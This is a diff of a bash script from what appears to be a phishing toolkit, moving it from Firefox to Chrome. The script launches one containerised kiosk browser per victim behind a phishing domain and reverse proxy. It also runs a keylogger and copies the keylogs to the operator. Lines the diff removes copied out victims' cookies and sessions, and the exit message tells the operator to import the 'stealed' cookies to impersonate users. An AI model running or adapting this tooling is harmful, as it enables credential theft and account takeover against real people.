@@ -1,59 +1,5 @@
 #!/bin/bash
 
-# [ Cool banner ]
-cat << EOF
-                          __    __       __    
- .--.--.-----.-----.-----|  |--|__.-----|  |--.
- |  |  |  -__|__ --|  _  |     |  |__ --|     |
- |___  |_____|_____|   __|__|__|__|_____|__|__|
- |_____|           |__|                        
-
-EOF
-
-#
-# [ Argument Parsing ]
-#
-
-helpFunction() {
-    echo ""
-    echo "Usage: $0 -u No. Users -d Domain -t Target"
-    echo -e "\t -u Number of users - please note for every user a container is spawned so don't go crazy"
-    echo -e "\t -d Domain which is used for phishing"
-    echo -e "\t -t Target website which should be displayed for the user"
-    echo -e "\t -e Export format"
-    echo -e "\t -s true / false if ssl is required - if ssl is set pem and key file are needed"
-    echo -e "\t -c Full path to the pem file of the ssl certificate"
-    echo -e "\t -k Full path to the key file of the ssl certificate"
-    echo -e "\t -a Adjust default user agent string"  
-    echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
-    echo -e "\t -r true / false to turn on the redirection to the target page"
-    echo -e "\t -x true / false to turn on the remote debugging port in all browsers"
-    echo -e "\t -l Preferred language codes for the browser (such as en,es,pt,pt-BR)"
-    echo -e "\t -m Enable mobile mode (spawns 2 containers for each user)"
-    exit 1 # Exit script after printing help
-}
-
-while getopts "u:d:t:s:c:k:e:a:z:p:r:x:l:m:" opt
-do
-    case "$opt" in
-        u ) User="$OPTARG" ;;
-        d ) Domain="$OPTARG" ;;
-        t ) Target="$OPTARG" ;;
-        e ) OFormat="$OPTARG" ;;
-        s ) SSL="$OPTARG" ;;
-        c ) cert="$OPTARG" ;;
-        k ) key="$OPTARG" ;;
-        a ) useragent=$OPTARG ;;
-        z ) rzip=$OPTARG ;;
-        p ) param=$OPTARG ;;
-        r ) Redirect=$OPTARG ;;
-        x ) DebugPort=$OPTARG ;;
-        l ) AcceptLang=$OPTARG ;;
-        m ) EnableMobile=$OPTARG ;;
-        ? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
-    esac
-done
-
 #
 # [ Globals ]
 #
@@ -65,6 +11,58 @@ BLUE='\033[0;34m'
 NC='\033[0m'
 PROFILE_COPY_INTERVAL=5
 APACHEFILE="./proxy/000-default.conf"
+
+# [ Cool banner ]
+cat << EOF
+                          __    __       __    
+ .--.--.-----.-----.-----|  |--|__.-----|  |--.
+ |  |  |  -__|__ --|  _  |     |  |__ --|     |
+ |___  |_____|_____|   __|__|__|__|_____|__|__|
+ |_____|           |__|                        
+
+EOF
+echo -e "${BLUE}patchright-chrome branch${NC}"
+echo ""
+
+#
+# [ Argument Parsing ]
+#
+
+helpFunction() {
+    echo ""
+    echo "Usage: $0 -u No. Users -d Domain -t Target"
+    echo -e "\t -u Number of users - please note for every user a container is spawned so don't go crazy"
+    echo -e "\t -d Domain which is used for phishing"
+    echo -e "\t -t Target website which should be displayed for the user"
+    echo -e "\t -s true / false if ssl is required - if ssl is set pem and key file are needed"
+    echo -e "\t -c Full path to the pem file of the ssl certificate"
+    echo -e "\t -k Full path to the key file of the ssl certificate"
+    echo -e "\t -a Adjust default user agent string"  
+    echo -e "\t -r true / false to turn on the redirection to the target page"
+    echo -e "\t -x true / false to turn on the remote debugging port in all browsers"
+    echo -e "\t -l Preferred language codes for the browser (such as en,es,pt,pt-BR)"
+    echo -e "\t -m Enable mobile mode (spawns 2 containers for each user)"
+    exit 1 # Exit script after printing help
+}
+
+while getopts "u:d:t:s:c:k:a:p:r:x:l:m:" opt
+do
+    case "$opt" in
+        u ) User="$OPTARG" ;;
+        d ) Domain="$OPTARG" ;;
+        t ) Target="$OPTARG" ;;
+        s ) SSL="$OPTARG" ;;
+        c ) cert="$OPTARG" ;;
+        k ) key="$OPTARG" ;;
+        a ) useragent=$OPTARG ;;
+        p ) param=$OPTARG ;;
+        r ) Redirect=$OPTARG ;;
+        x ) DebugPort=$OPTARG ;;
+        l ) AcceptLang=$OPTARG ;;
+        m ) EnableMobile=$OPTARG ;;
+        ? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
+    esac
+done
 
 # Begin script in case all parameters are correct
 
@@ -162,58 +160,17 @@ copy_profile() {
     if [ $mobile = "true" ]; then
         DATA_CONT=mvnc-user$x
         NAME_USER=muser$x
-        NAME_PROF=mphis$x
     else
         DATA_CONT=vnc-user$x
         NAME_USER=user$x
-        NAME_PROF=phis$x
     fi
 
     # Copy browser data into a central folder
     # and copy keylogger results to host
-    sudo docker exec $DATA_CONT sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
-    sudo docker exec $DATA_CONT sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
     sudo docker exec $DATA_CONT test -e /home/headless/Keylog.txt && sudo docker cp $DATA_CONT:/home/headless/Keylog.txt ./$NAME_USER-keylog.txt
     #sleep 2
 
-    # Copy browser data from the central folder
-    # to the host
-    sudo docker cp $DATA_CONT:/home/headless/recovery.jsonlz4 ./$NAME_USER-recovery.jsonlz4
-    sudo docker cp $DATA_CONT:/home/headless/cookies.sqlite ./$NAME_USER-cookies.sqlite
-    sudo docker exec $DATA_CONT sh -c "rm -f /home/headless/recovery.jsonlz4"
-    sudo docker exec $DATA_CONT sh -c "rm -f /home/headless/cookies.sqlite"
-
-    sleep 2
-    if [ -n "$OFormat" ]; then
-        FormatArg=simple
-    else
-        FormatArg=default
-
-        sudo docker exec $DATA_CONT sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
-        sudo docker cp $DATA_CONT:/home/headless/ffprofile ./$NAME_PROF-ffprofile
-        sudo docker exec $DATA_CONT sh -c "rm -rf /home/headless/ffprofile"
-        sudo chown -R 1000 ./$NAME_PROF-ffprofile
-
-        if [ "$rzip" = "true" ]; then
-            zip -r $NAME_PROF-ffprofile.zip $NAME_PROF-ffprofile/ &> /dev/null
-            rm -r $NAME_PROF-ffprofile/
-        fi
-    fi
-
     popd &> /dev/null
-
-    python3 ./scripts/session-collector.py ./$NAME_USER-recovery.jsonlz4 $FormatArg
-    python3 ./scripts/cookies-collector.py ./$NAME_USER-cookies.sqlite $FormatArg
-
-    pushd ./output &> /dev/null
-
-    rm -f user$x-recovery.jsonlz4 \
-          user$x-cookies.sqlite user$x-cookies.sqlite* \
-          muser$x-recovery.jsonlz4 muser$x-cookies.sqlite muser$x-cookies.sqlite*
-
-    popd &> /dev/null
-
-    python3 ./scripts/status.py $x "${urls[$(($x - 1))]}"
 }
 
 #
@@ -314,31 +271,29 @@ case "$1" in
     
     cat templates/status.header.php > ./output/status.php
 
+    CHROME_PATH_DESKTOP='/opt/google/chrome/chrome'
+    CHROME_PATH_MOBILE='/opt/google/chrome/chrome'
+
     # Start with a basic template for user preferences, then
     # fill them with needed values for each case
     # and upload to each container
-    cat templates/user.header.js > vnc/muser.js;
-    cat templates/user.header.js > vnc/user.js;
-    echo "" >> vnc/muser.js;
-    echo "" >> vnc/user.js;
     if [ -n $AcceptLang ]; then
-        echo 'user_pref("intl.accept_languages", "'$AcceptLang'");' >> ./vnc/muser.js
-        echo 'user_pref("intl.accept_languages", "'$AcceptLang'");' >> ./vnc/user.js
+        CHROME_PATH_DESKTOP=$CHROME_PATH_DESKTOP" --lang="$AcceptLang
+        CHROME_PATH_MOBILE=$CHROME_PATH_MOBILE" --lang="$AcceptLang
     fi
 
     if [ -n "$useragent" ]; then
         # Custom UA, mobile (don't override)
-        echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' >> ./vnc/muser.js
+        CHROME_PATH_MOBILE=$CHROME_PATH_MOBILE' --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/136.0.7103.91 Mobile/15E148 Safari/604.1"'
 
         # Custom UA, desktop (override)
-        echo 'user_pref("general.useragent.override","'$useragent'");' >> ./vnc/user.js
+        CHROME_PATH_DESKTOP=$CHROME_PATH_DESKTOP' --user-agent="'$useragent'"'
     else
         # No custom UA, mobile
-        echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' >> ./vnc/muser.js
-        echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
+        CHROME_PATH_MOBILE=$CHROME_PATH_MOBILE' --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/136.0.7103.91 Mobile/15E148 Safari/604.1"'
 
         # No custom UA, desktop
-        echo 'user_pref("general.useragent.override","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0");' >> ./vnc/user.js
+        CHROME_PATH_DESKTOP=$CHROME_PATH_DESKTOP' --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"'
     fi
 
     mobile=false
@@ -351,11 +306,15 @@ case "$1" in
             VNC_IMG=mvnc-docker;
             VNC_CONT=mvnc-user$c;
             PREF_FILE='./vnc/muser.js';
+            CHROME_PATH="$CHROME_PATH_MOBILE"
         else
             VNC_IMG=vnc-docker;
             VNC_CONT=vnc-user$c;
             PREF_FILE='./vnc/user.js';
+            CHROME_PATH="$CHROME_PATH_DESKTOP"
         fi
+
+        echo "$CHROME_PATH"
 
         echo -e "${BLUE}———— ${VNC_CONT} (from image ${VNC_IMG}) [$c/$END] ————${NC}";
 
@@ -364,7 +323,7 @@ case "$1" in
         Token=$(cat /proc/sys/kernel/random/uuid)
 
         # Start up the corresponding VNC container
-        # and then firefox a single time (just to set up the profile?)
+        # and then Chrome a single time (just to set up the profile?)
         echo -e "${YELLOW}[+] Starting VNC container${NC}"
         if [ "$DebugPort" = "true" ]; then
             DEBUGPORT_HOST=9$(printf "%03d" $c)
@@ -379,12 +338,12 @@ case "$1" in
         fi
         echo -e "${GREEN}[+] VNC container started${NC}"
 
-        echo -e "${YELLOW}[+] Setting up firefox profile...${NC}"
+        echo -e "${YELLOW}[+] Setting up chrome profile...${NC}"
 
         sleep 3
-        sudo docker exec $VNC_CONT sh -c "firefox &" &> /dev/null
+        sudo docker exec $VNC_CONT sh -c "$CHROME_PATH &" &> /dev/null
         sleep 1
-        sudo docker exec $VNC_CONT sh -c "pidof firefox | xargs kill &" &> /dev/null
+        sudo docker exec $VNC_CONT sh -c "pidof chrome | xargs kill &" &> /dev/null
         sleep 2
 
         sudo docker cp $PREF_FILE $VNC_CONT:/home/headless/user.js
@@ -427,9 +386,9 @@ case "$1" in
         echo -e "${GREEN}[+] Keylogger started${NC}"
         
         if [ "$DebugPort" = "true" ]; then
-            FIREFOX_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --remote-debugging-port=9222 --kiosk &"
+            CHROME_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 $CHROME_PATH $Target --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-debug --disable-fre --no-default-browser-check --no-first-run --kiosk &"
         else
-            FIREFOX_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &"
+            CHROME_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 $CHROME_PATH $Target --disable-fre --no-default-browser-check --no-first-run --kiosk &"
         fi
 
         if [ "$mobile" = "true" ]; then
@@ -439,7 +398,7 @@ case "$1" in
         fi     
 
         echo -e "${YELLOW}[~] Starting browser...${NC}"
-        sudo docker exec $VNC_CONT sh -c "$FIREFOX_SPAWN_CMD" &> /dev/null    
+        sudo docker exec $VNC_CONT sh -c "$CHROME_SPAWN_CMD" &> /dev/null    
         echo -e "${GREEN}[+] Browser started${NC}"
 
         CIP=$(sudo docker container inspect $VNC_CONT | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
@@ -612,13 +571,10 @@ case "$1" in
         echo -e "${GREEN}[+] Cleared existing ./output/phis.db...${NC}"
     fi
     
-    echo -e "[~] Starting Loop to collect sessions and cookies from containers${NC}" 
+    echo -e "[~] Use the provided patchright scripts to dump cookies${NC}" 
     echo -e "    You can check and view the open session by use of the status.php in the output directory${NC}" 
 
-    # Start a loop which copies the cookies from the containers
-    echo -e "    Every $PROFILE_COPY_INTERVAL Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop.."
-
-    trap 'echo -e "\n[~] Import stealed session and cookie JSON or the firefox profile to impersonate user"; echo -e "[~] VNC and Rev-Proxy container will be removed" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
+    trap 'echo -e "\n[~] Import stealed session and cookie JSON to impersonate user"; echo -e "[~] VNC and Rev-Proxy container will be removed" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
 
     sleep $PROFILE_COPY_INTERVAL
 
